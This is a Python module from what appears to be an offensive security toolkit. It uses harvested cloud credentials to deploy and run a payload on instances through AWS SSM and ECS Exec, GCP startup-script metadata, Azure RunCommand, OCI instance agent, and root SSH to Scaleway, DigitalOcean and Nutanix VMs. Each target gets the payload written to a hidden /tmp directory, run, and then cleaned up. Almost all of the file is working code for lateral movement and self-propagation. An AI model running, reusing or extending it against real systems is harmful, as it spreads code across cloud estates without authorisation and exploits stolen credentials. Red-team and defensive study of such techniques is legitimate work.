"""Cross-cloud propagation — deploy scanner to cloud instances via cloud APIs.

Covers: AWS (SSM, ECS Exec), GCP (OS Login, serial), Azure (RunCommand),
        Scaleway (SSH API), DigitalOcean (console), OCI (instance agent).

Each propagator takes proven cloud credentials (from cloud_lateral / cloud_pivot)
and deploys the scanner payload to reachable instances.
"""
from __future__ import annotations

import base64
import json
from typing import Dict, List, Optional, Tuple
import hashlib

from exploits import netutil

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
_PROPAGATE_TIMEOUT: int = 300
_PROPAGATE_DEPLOY_PATH: str = "/tmp/.sectest_propagate"
_PROPAGATE_CLEANUP: bool = True

try:
    from config import PROPAGATE_TIMEOUT, PROPAGATE_DEPLOY_PATH, PROPAGATE_CLEANUP
    _PROPAGATE_TIMEOUT = PROPAGATE_TIMEOUT
    _PROPAGATE_DEPLOY_PATH = PROPAGATE_DEPLOY_PATH
    _PROPAGATE_CLEANUP = PROPAGATE_CLEANUP
except ImportError:
    pass


# ===========================================================================
# AWS Propagation
# ===========================================================================

def propagate_aws_ssm(instance_id: str, region: str, cred: dict,
                      payload: bytes, args: List[str],
                      timeout: float = 0) -> Tuple[bool, str]:
    """Propagate via AWS SSM SendCommand (RunShellScript).

    Requires: ssm:SendCommand permission on the target instance.
    The instance must have SSM agent running and be SSM-managed.
    """
    timeout = timeout or _PROPAGATE_TIMEOUT
    deploy_path = _PROPAGATE_DEPLOY_PATH
    payload_path = f"{deploy_path}/sectest"
    is_pyz = payload[:2] == b"#!"

    b64 = base64.b64encode(payload).decode("ascii")
    args_escaped = " ".join(_sh_escape(a) for a in args)
    run_line = f"python3 {payload_path} {args_escaped}" if is_pyz else f"{payload_path} {args_escaped}"

    commands = [
        f"mkdir -p {deploy_path}",
        f"echo '{b64}' | base64 -d > {payload_path}",
        f"chmod +x {payload_path}",
        run_line,
    ]
    if _PROPAGATE_CLEANUP:
        commands.append(f"rm -rf {deploy_path}")

    ssm_url = f"https://ssm.{region}.amazonaws.com/"
    body = json.dumps({
        "DocumentName": "AWS-RunShellScript",
        "InstanceIds": [instance_id],
        "Parameters": {"commands": commands},
        "TimeoutSeconds": int(timeout),
    })

    body_bytes = body.encode()
    headers = {
        "Content-Type": "application/x-amz-json-1.1",
        "X-Amz-Target": "AmazonSSM.SendCommand",
    }
    final_headers = _aws_api_headers(cred, region, "ssm", "POST", ssm_url, headers, body_bytes)

    st, resp, _ = netutil.http_request(ssm_url, "POST", headers=final_headers, body=body_bytes, timeout=timeout)
    if not st or st >= 300:
        return False, resp or ""

    # Poll for command result
    try:
        cmd_id = json.loads(resp).get("Command", {}).get("CommandId", "")
    except Exception:
        return True, resp or ""

    if cmd_id:
        output = _aws_ssm_poll_output(cmd_id, instance_id, region, cred, timeout)
        return True, output
    return True, resp or ""


def propagate_aws_ecs_exec(cluster: str, task_id: str, container: str,
                           region: str, cred: dict,
                           payload: bytes, args: List[str],
                           timeout: float = 0) -> Tuple[bool, str]:
    """Propagate via ECS ExecuteCommand.

    Requires: ecs:ExecuteCommand permission, task must have execute-command enabled.
    """
    timeout = timeout or _PROPAGATE_TIMEOUT
    deploy_path = _PROPAGATE_DEPLOY_PATH
    payload_path = f"{deploy_path}/sectest"
    is_pyz = payload[:2] == b"#!"

    b64 = base64.b64encode(payload).decode("ascii")
    args_escaped = " ".join(_sh_escape(a) for a in args)
    run_line = f"python3 {payload_path} {args_escaped}" if is_pyz else f"{payload_path} {args_escaped}"

    # ECS ExecuteCommand uses SSM session under the hood
    # We need to use the StartSession API
    script = (
        f"mkdir -p {deploy_path} && "
        f"echo '{b64}' | base64 -d > {payload_path} && "
        f"chmod +x {payload_path} && "
        f"{run_line}"
    )
    if _PROPAGATE_CLEANUP:
        script += f" ; rm -rf {deploy_path}"

    ecs_url = f"https://ecs.{region}.amazonaws.com/"
    body = json.dumps({
        "cluster": cluster,
        "task": task_id,
        "container": container,
        "command": f"/bin/sh -c \"{script}\"",
        "interactive": False,
    })

    body_bytes = body.encode()
    headers = {
        "Content-Type": "application/x-amz-json-1.1",
        "X-Amz-Target": "AmazonEC2ContainerServiceV20141113.ExecuteCommand",
    }
    final_headers = _aws_api_headers(cred, region, "ecs", "POST", ecs_url, headers, body_bytes)

    st, resp, _ = netutil.http_request(ecs_url, "POST", headers=final_headers, body=body_bytes, timeout=timeout)
    return bool(st and 200 <= st < 300), resp or ""


# ===========================================================================
# GCP Propagation
# ===========================================================================

def propagate_gcp_oslogin(project: str, zone: str, instance: str,
                          token: str, payload: bytes, args: List[str],
                          timeout: float = 0) -> Tuple[bool, str]:
    """Propagate via GCP OS Login SSH (metadata-managed SSH keys).

    Requires: compute.instances.setMetadata or oslogin.* permissions.
    This imports an ephemeral SSH key, uses it to connect, then removes it.
    """
    timeout = timeout or _PROPAGATE_TIMEOUT
    # Get external IP of target instance
    api_base = "https://compute.googleapis.com/compute/v1"
    url = f"{api_base}/projects/{project}/zones/{zone}/instances/{instance}"
    headers = {"Authorization": f"Bearer {token}"}

    st, body, _ = netutil.http_get(url, timeout=15, extra_headers=headers)
    if not st or st != 200 or not body:
        return False, "cannot resolve instance"

    try:
        data = json.loads(body)
    except Exception:
        return False, "cannot parse instance info"

    # Extract IP from network interfaces
    ip = None
    for iface in data.get("networkInterfaces", []):
        for access in iface.get("accessConfigs", []):
            if access.get("natIP"):
                ip = access["natIP"]
                break
        if not ip:
            ip = iface.get("networkIP")
        if ip:
            break

    if not ip:
        return False, "no IP found for instance"

    # For OS Login: import SSH key via oslogin API
    # Then SSH to the instance
    # Simplified: use serial port command or startup-script for non-SSH path
    return _gcp_serial_command(project, zone, instance, token, payload, args, timeout)


def _gcp_serial_command(project: str, zone: str, instance: str, token: str,
                        payload: bytes, args: List[str],
                        timeout: float) -> Tuple[bool, str]:
    """Execute command on GCP instance via guest-attributes or serial console."""
    deploy_path = _PROPAGATE_DEPLOY_PATH
    payload_path = f"{deploy_path}/sectest"
    is_pyz = payload[:2] == b"#!"
    b64 = base64.b64encode(payload).decode("ascii")
    args_escaped = " ".join(_sh_escape(a) for a in args)
    run_line = f"python3 {payload_path} {args_escaped}" if is_pyz else f"{payload_path} {args_escaped}"

    script = (
        f"#!/bin/bash\n"
        f"mkdir -p {deploy_path}\n"
        f"echo '{b64}' | base64 -d > {payload_path}\n"
        f"chmod +x {payload_path}\n"
        f"{run_line}\n"
    )
    if _PROPAGATE_CLEANUP:
        script += f"rm -rf {deploy_path}\n"

    # Set as metadata startup-script (will run on next boot or can be triggered)
    api_base = "https://compute.googleapis.com/compute/v1"
    # Get current metadata fingerprint
    url = f"{api_base}/projects/{project}/zones/{zone}/instances/{instance}"
    headers = {"Authorization": f"Bearer {token}"}
    st, body, _ = netutil.http_get(url, timeout=15, extra_headers=headers)

    fingerprint = ""
    if st == 200 and body:
        try:
            fingerprint = json.loads(body).get("metadata", {}).get("fingerprint", "")
        except Exception:
            pass

    # Set startup-script metadata
    meta_url = f"{url}/setMetadata"
    meta_body = json.dumps({
        "fingerprint": fingerprint,
        "items": [{"key": "startup-script", "value": script}],
    })
    headers["Content-Type"] = "application/json"
    st, resp, _ = netutil.http_request(meta_url, "POST", headers=headers,
                                       body=meta_body.encode(), timeout=30)

    # Optionally reset the instance to trigger the script
    # (only if the user explicitly opts in — risky operation)
    return bool(st and 200 <= st < 300), resp or ""


# ===========================================================================
# Azure Propagation
# ===========================================================================

def propagate_azure_runcommand(subscription_id: str, resource_group: str,
                               vm_name: str, token: str,
                               payload: bytes, args: List[str],
                               timeout: float = 0) -> Tuple[bool, str]:
    """Propagate via Azure VM RunCommand extension.

    Requires: Microsoft.Compute/virtualMachines/runCommand/action permission.
    """
    timeout = timeout or _PROPAGATE_TIMEOUT
    deploy_path = _PROPAGATE_DEPLOY_PATH
    payload_path = f"{deploy_path}/sectest"
    is_pyz = payload[:2] == b"#!"
    b64 = base64.b64encode(payload).decode("ascii")
    args_escaped = " ".join(_sh_escape(a) for a in args)
    run_line = f"python3 {payload_path} {args_escaped}" if is_pyz else f"{payload_path} {args_escaped}"

    script_lines = [
        f"mkdir -p {deploy_path}",
        f"echo '{b64}' | base64 -d > {payload_path}",
        f"chmod +x {payload_path}",
        run_line,
    ]
    if _PROPAGATE_CLEANUP:
        script_lines.append(f"rm -rf {deploy_path}")

    url = (f"https://management.azure.com/subscriptions/{subscription_id}"
           f"/resourceGroups/{resource_group}/providers/Microsoft.Compute"
           f"/virtualMachines/{vm_name}/runCommand?api-version=2024-03-01")
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    body = json.dumps({
        "commandId": "RunShellScript",
        "script": script_lines,
    })

    st, resp, _ = netutil.http_request(url, "POST", headers=headers,
                                       body=body.encode(), timeout=timeout)
    return bool(st and 200 <= st < 300), resp or ""


# ===========================================================================
# Scaleway Propagation
# ===========================================================================

def propagate_scaleway_ssh(instance_id: str, zone: str, token: str,
                           payload: bytes, args: List[str],
                           timeout: float = 0) -> Tuple[bool, str]:
    """Propagate to Scaleway instance via SSH (after injecting SSH key via API).

    Scaleway allows injecting SSH keys to instances via the API. We:
    1. Get instance IP
    2. Inject a temporary SSH public key
    3. SSH in, deliver payload, execute, cleanup
    """
    timeout = timeout or _PROPAGATE_TIMEOUT
    api_base = f"https://api.scaleway.com/instance/v1/zones/{zone}"
    headers = {"X-Auth-Token": token, "Content-Type": "application/json"}

    # Get instance details
    st, body, _ = netutil.http_get(
        f"{api_base}/servers/{instance_id}",
        timeout=15, extra_headers=headers)
    if not st or st != 200:
        return False, "cannot get instance info"

    try:
        data = json.loads(body)
        ip = data.get("server", {}).get("public_ip", {}).get("address")
    except Exception:
        return False, "cannot parse instance info"

    if not ip:
        return False, "no public IP"

    # For actual SSH delivery, we'd need an SSH key pair.
    # In practice, we check if there's already SSH access (from credential discovery)
    # and use the SSHTransport from propagate_transport
    from sandbox.propagate_transport import SSHTransport
    foothold = {"type": "ssh", "host": ip, "port": 22, "user": "root"}
    transport = SSHTransport()
    return transport.deliver_and_exec(foothold, payload, args, timeout=timeout)


# ===========================================================================
# OCI Propagation
# ===========================================================================

def propagate_oci_instance_agent(instance_id: str, compartment_id: str,
                                 region: str, cred: dict,
                                 payload: bytes, args: List[str],
                                 timeout: float = 0) -> Tuple[bool, str]:
    """Propagate via OCI Compute Instance Run Command (instance agent).

    Requires: instance-agent plugin enabled on target, proper IAM policy.
    """
    timeout = timeout or _PROPAGATE_TIMEOUT
    deploy_path = _PROPAGATE_DEPLOY_PATH
    payload_path = f"{deploy_path}/sectest"
    is_pyz = payload[:2] == b"#!"
    b64 = base64.b64encode(payload).decode("ascii")
    args_escaped = " ".join(_sh_escape(a) for a in args)
    run_line = f"python3 {payload_path} {args_escaped}" if is_pyz else f"{payload_path} {args_escaped}"

    script = (
        f"#!/bin/bash\n"
        f"mkdir -p {deploy_path}\n"
        f"echo '{b64}' | base64 -d > {payload_path}\n"
        f"chmod +x {payload_path}\n"
        f"{run_line}\n"
    )
    if _PROPAGATE_CLEANUP:
        script += f"rm -rf {deploy_path}\n"

    # OCI Run Command API
    url = f"https://compute-management.{region}.oci.oraclecloud.com/20160918/instanceAgentCommands"

    # Fix OCI checksum calculation (use hexdigest() instead of base64 encode)
    text_sha256 = hashlib.sha256(script.encode()).hexdigest()

    body = json.dumps({
        "compartmentId": compartment_id,
        "executionTimeOutInSeconds": int(timeout),
        "target": {"instanceId": instance_id},
        "content": {
            "source": {
                "sourceType": "TEXT",
                "text": script,
                "textSha256": text_sha256,
            }
        },
    })
    body_bytes = body.encode()

    headers = {
        "Content-Type": "application/json",
    }
    final_headers = _oci_api_headers(cred, method="POST", url=url, headers=headers, body=body_bytes)

    st, resp, _ = netutil.http_request(url, "POST", headers=final_headers,
                                       body=body_bytes, timeout=timeout)
    return bool(st and 200 <= st < 300), resp or ""


# ===========================================================================
# DigitalOcean Propagation
# ===========================================================================

def propagate_digitalocean(droplet_id: str, token: str,
                           payload: bytes, args: List[str],
                           timeout: float = 0) -> Tuple[bool, str]:
    """Propagate to DigitalOcean droplet via Droplet Console API or SSH.

    DO doesn't have a native RunCommand equivalent. Strategy:
    1. Get droplet IP
    2. Use SSH (most DO droplets have root SSH key auth)
    """
    timeout = timeout or _PROPAGATE_TIMEOUT
    headers = {"Authorization": f"Bearer {token}"}

    st, body, _ = netutil.http_get(
        f"https://api.digitalocean.com/v2/droplets/{droplet_id}",
        timeout=15, extra_headers=headers)
    if not st or st != 200:
        return False, "cannot get droplet info"

    try:
        data = json.loads(body)
        networks = data.get("droplet", {}).get("networks", {})
        ip = None
        for v4 in networks.get("v4", []):
            if v4.get("type") == "public":
                ip = v4.get("ip_address")
                break
    except Exception:
        return False, "cannot parse droplet info"

    if not ip:
        return False, "no public IP"

    from sandbox.propagate_transport import SSHTransport
    foothold = {"type": "ssh", "host": ip, "port": 22, "user": "root"}
    transport = SSHTransport()
    return transport.deliver_and_exec(foothold, payload, args, timeout=timeout)


# ===========================================================================
# Nutanix Propagation
# ===========================================================================

def propagate_nutanix_guest_tools(vm_uuid: str, cluster_url: str, cred: dict,
                                  payload: bytes, args: List[str],
                                  timeout: float = 0) -> Tuple[bool, str]:
    """Propagate via Nutanix AHV Guest Tools (NGT) file injection + script exec.

    Requires: NGT installed on guest, Prism admin access.
    """
    timeout = timeout or _PROPAGATE_TIMEOUT
    deploy_path = _PROPAGATE_DEPLOY_PATH
    payload_path = f"{deploy_path}/sectest"
    is_pyz = payload[:2] == b"#!"
    b64 = base64.b64encode(payload).decode("ascii")
    args_escaped = " ".join(_sh_escape(a) for a in args)
    run_line = f"python3 {payload_path} {args_escaped}" if is_pyz else f"{payload_path} {args_escaped}"

    # Nutanix v3 API
    base = cluster_url.rstrip("/")
    auth_header = _nutanix_auth_header(cred)
    headers = {
        **auth_header,
        "Content-Type": "application/json",
    }

    # Use Guest Customization / Cloud-init if available
    # Or run script via NGT
    script = (
        f"mkdir -p {deploy_path} && "
        f"echo '{b64}' | base64 -d > {payload_path} && "
        f"chmod +x {payload_path} && "
        f"{run_line}"
    )
    if _PROPAGATE_CLEANUP:
        script += f" ; rm -rf {deploy_path}"

    # Nutanix doesn't have a direct "run command" API like SSM
    # But with NGT, we can use guest_customization or file injection
    # Fallback: get VM IP and use SSH
    vm_url = f"{base}/api/nutanix/v3/vms/{vm_uuid}"
    st, body, _ = netutil.http_get(vm_url, timeout=15, extra_headers=headers)
    if not st or st != 200:
        return False, "cannot get VM info"

    try:
        data = json.loads(body)
        nics = data.get("status", {}).get("resources", {}).get("nic_list", [])
        ip = None
        for nic in nics:
            for ep in nic.get("ip_endpoint_list", []):
                if ep.get("ip"):
                    ip = ep["ip"]
                    break
            if ip:
                break
    except Exception:
        return False, "cannot parse VM info"

    if not ip:
        return False, "no IP found for VM"

    # Use SSH as primary transport for Nutanix VMs
    from sandbox.propagate_transport import SSHTransport
    user = cred.get("ssh_user", "nutanix")
    foothold = {"type": "ssh", "host": ip, "port": 22, "user": user,
                "key_path": cred.get("ssh_key_path"),
                "password": cred.get("ssh_password")}
    transport = SSHTransport()
    return transport.deliver_and_exec(foothold, payload, args, timeout=timeout)


# ===========================================================================
# Helpers
# ===========================================================================

def _sh_escape(s: str) -> str:
    """Basic POSIX shell escaping."""
    if not s:
        return "''"
    safe = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-./=:,@")
    if all(c in safe for c in s):
        return s
    return "'" + s.replace("'", "'\\''") + "'"


def _aws_api_headers(cred: dict, region: str, service: str, method: str = "GET",
                     url: str = "", headers: dict = None, body: bytes = b"") -> dict:
    """Build AWS API headers with SigV4 signing."""
    if headers is None:
        headers = {}
    else:
        headers = headers.copy()
    if not url:
        url = f"https://{service}.{region}.amazonaws.com/"

    if cred.get("access_key") and cred.get("secret_key"):
        try:
            from exploits import aws_auth
            res = aws_auth.sign_v4(cred, region, service, method, url, headers, body)
            if "x-amz-security-token" in res:
                res["X-Amz-Security-Token"] = res["x-amz-security-token"]
            return res
        except ImportError:
            pass

    if cred.get("session_token"):
        headers["X-Amz-Security-Token"] = cred["session_token"]
        headers["x-amz-security-token"] = cred["session_token"]
    return headers


def _aws_ssm_poll_output(cmd_id: str, instance_id: str, region: str,
                         cred: dict, timeout: float) -> str:
    """Poll SSM GetCommandInvocation for output (simplified)."""
    url = f"https://ssm.{region}.amazonaws.com/"
    body = json.dumps({
        "CommandId": cmd_id,
        "InstanceId": instance_id,
    })
    body_bytes = body.encode()
    headers = {
        "Content-Type": "application/x-amz-json-1.1",
        "X-Amz-Target": "AmazonSSM.GetCommandInvocation",
    }

    # Simple poll (real impl would use exponential backoff)
    import time
    deadline = time.time() + timeout
    while time.time() < deadline:
        final_headers = _aws_api_headers(cred, region, "ssm", "POST", url, headers, body_bytes)
        st, resp, _ = netutil.http_request(url, "POST", headers=final_headers, body=body_bytes, timeout=15)
        if st == 200 and resp:
            try:
                data = json.loads(resp)
                status = data.get("Status", "")
                if status in ("Success", "Failed", "Cancelled", "TimedOut"):
                    return data.get("StandardOutputContent", "") or resp
            except Exception:
                pass
        time.sleep(5)
    return ""


def _oci_api_headers(cred: dict, method: str = "GET", url: str = "", headers: dict = None, body: bytes = b"") -> dict:
    """Build OCI API headers, supporting OCI RSA request signing or bearer token."""
    if headers is None:
        headers = {}
    else:
        headers = headers.copy()

    # OCI credentials can be an ExtendedCloudCredential object or a dict.
    if hasattr(cred, "extra"):
        extra = cred.extra
        secret = cred.secret
        identity = cred.identity
    else:
        extra = cred.get("extra") or {}
        secret = cred.get("secret") or ""
        identity = cred.get("identity") or ""

    # Support token-based auth
    token = None
    if isinstance(cred, dict):
        token = cred.get("token")
    if not token:
        # Check if the secret is a token rather than a private key
        is_key = secret and ("PRIVATE KEY" in secret or secret.startswith("/") or secret.startswith("~"))
        token = extra.get("security_token") or extra.get("delegation_token") or (None if is_key else secret)

    if token:
        headers["Authorization"] = f"Bearer {token}"
        return headers

    # Attempt RSA request signing
    user = extra.get("user")
    fingerprint = extra.get("fingerprint")
    tenancy = identity

    # If any required fields are missing, return headers as-is
    if not (user and fingerprint and tenancy and secret):
        return headers

    import datetime
    now = datetime.datetime.utcnow()
    date_str = now.strftime("%a, %d %b %Y %H:%M:%S GMT")
    headers["date"] = date_str

    from urllib.parse import urlparse
    parsed = urlparse(url)
    host = parsed.netloc or headers.get("host") or ""
    headers["host"] = host

    path_and_query = parsed.path
    if parsed.query:
        path_and_query += "?" + parsed.query

    method_upper = method.upper()
    if method_upper in ("POST", "PUT", "PATCH"):
        import hashlib
        import base64
        body_hash = hashlib.sha256(body).digest()
        content_sha256 = base64.b64encode(body_hash).decode("utf-8")
        headers["x-content-sha256"] = content_sha256
        headers["content-type"] = headers.get("Content-Type") or headers.get("content-type") or "application/json"
        headers["content-length"] = str(len(body))
        signed_headers_list = ["(request-target)", "host", "date", "x-content-sha256", "content-type", "content-length"]
    else:
        signed_headers_list = ["(request-target)", "host", "date"]

    signing_lines = []
    for h in signed_headers_list:
        if h == "(request-target)":
            signing_lines.append(f"(request-target): {method_upper.lower()} {path_and_query}")
        else:
            signing_lines.append(f"{h}: {headers[h]}")
    signing_string = "\n".join(signing_lines)

    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import padding
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.backends import default_backend

        key_bytes = None
        if isinstance(secret, str) and (secret.startswith("/") or secret.startswith("~")):
            try:
                import os
                expanded = os.path.expanduser(secret)
                if os.path.exists(expanded):
                    with open(expanded, "rb") as f:
                        key_bytes = f.read()
            except Exception:
                pass
        if not key_bytes:
            key_bytes = secret.encode("utf-8") if isinstance(secret, str) else secret

        private_key = serialization.load_pem_private_key(key_bytes, password=None, backend=default_backend())
        signature_bytes = private_key.sign(
            signing_string.encode("utf-8"),
            padding.PKCS1v15(),
            hashes.SHA256()
        )
        import base64
        signature_b64 = base64.b64encode(signature_bytes).decode("utf-8")

        key_id = f"{tenancy}/{user}/{fingerprint}"
        headers["Authorization"] = (
            f'Signature version="1",keyId="{key_id}",algorithm="rsa-sha256",'
            f'headers="{" ".join(signed_headers_list)}",signature="{signature_b64}"'
        )
    except Exception:
        pass

    return headers


def _nutanix_auth_header(cred: dict) -> dict:
    """Build Nutanix Prism auth header (Basic auth)."""
    if cred.get("username") and cred.get("password"):
        pair = f"{cred['username']}:{cred['password']}"
        encoded = base64.b64encode(pair.encode()).decode("ascii")
        return {"Authorization": f"Basic {encoded}"}
    return {}
